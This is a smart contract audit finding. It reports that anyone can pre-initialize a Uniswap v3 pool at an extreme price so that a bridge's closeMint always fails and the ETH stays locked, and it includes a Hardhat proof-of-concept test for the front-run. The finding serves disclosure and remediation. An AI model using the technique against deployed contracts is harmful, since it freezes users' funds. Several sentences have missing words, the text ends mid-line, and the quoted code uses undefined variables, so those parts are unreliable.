# [H] Initializing the pool in uniswap will lock all ETH in bridge

## Summary
Severity: High
Contest weight: 0.8516
Dataset id: 3967
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The rollout of $BLERB tokens and BLERB NFTs work in stages. During the first stage users can mint NFTs using different referral codes. Each NFT will cost 0.1 ETH. These ETH are split in three chunks, 50% goes to the protocol in what's called a genesis share. 25% will go to the referrers and the last 25% will be used to initialize a Uniswap v3 trading pool with initial liquidity. The Uniswap pool is initialized when the admin calls Bridge::closeMint, then initialized with the newly minted $BLERB tokens and wETH:
```solidity
function _mintInitialPosition(
    uint256 amountWeth,
    uint256 amountToken
) private {
    INonfungiblePositionManager.MintParams memory params = INonfungiblePositionManager.MintParams({
        token0: token0,
        token1: token1,
        fee: FEE_TIER,
        tickLower: MIN_TICK,
        tickUpper: MAX_TICK,
        amount0Desired: amount0Desired,
        amount1Desired: amount1Desired,
        amount0Min: (amount0Desired * 90) / 100,
        amount1Min: (amount1Desired * 90) / 100,
        recipient: address(this),
        deadline: block.timestamp
    });
    (uint256 tokenId, uint256 liquidity, , ) = manager.mint(params);
}
```
The issue is the slippage protection, amountMin: (amountDesired * 90) / 100. Someone can create the pool ahead of time with an initial price that will cause the Uniswap mint call to fail on Price slippage check. This will cause the whole call to Bridge::closeMint to fail and the Bridge to be forever stuck in the open minting state. Since the $BLERB tokens aren't minted until closeMint is called there is no easy way to recover from this. some initial tokens and trade them in the pool to return the price. This would still leave the pool vulnerable to price manipulation before the call to closeMint is done. Thus it's not a waterproof way and would require the protocol to diverge from the plan to only mint 100_000 $BLERB per NFT as this unplanned mint would be in excess of that.

## Proof of Concept
Add this test to Close.ts:
```solidity
it("Anyone can prevent closeMint by calling uniswap initialize directly", async () => {
    const fixture = await loadFixture(deployHybridFixture);
    const { bridge, token, others } = fixture;
    // nft mint happens
    await mintNfts(fixture);
    const positionManagerAddr = "0x03a520b32C04BF3bEEf7BEb72E919cf822Ed34f1";
    const positionManager = await ethers.getContractAt("INonfungiblePositionManager", positionManagerAddr);
    const wethAddr = "0x4200000000000000000000000000000000000006";
    const tokenAddr = await token.getAddress();
    const [token0, token1] = tokenAddr < wethAddr ? [tokenAddr, wethAddr] : [wethAddr, tokenAddr];
    const maxSqrtPrice = ethers.parseUnits("1461446703485210103287273052203988822378723970341", 18);
    // someone creates the pool early with another price
    const other = others[0];
    await positionManager.connect(other).createAndInitializePoolIfNecessary(token0, token1, 10_000, maxSqrtPrice);
    // admin cannot call close mint as pool price is wrong
    await expect(bridge.closeMint()).to.be.revertedWith("Price slippage check");
    // tokens have not been minted
    expect(await token.totalSupply()).to.be.equal(0);
});
```

## Recommendation
Consider initializing the pool yourself as soon as the token contract is created. It's predetermined what the price will be because regardless of how many NFTs are minted the proportions between $BLERB and wETH will be the same, 9000 $BLERB for every 0.025 wETH. Hence the pool can be avoid any possibility of someone starting the pool at an unfavorable price. This price is then impossible to change until closeMint is called, as there are no $BLERB tokens to trade before then. Blerb:
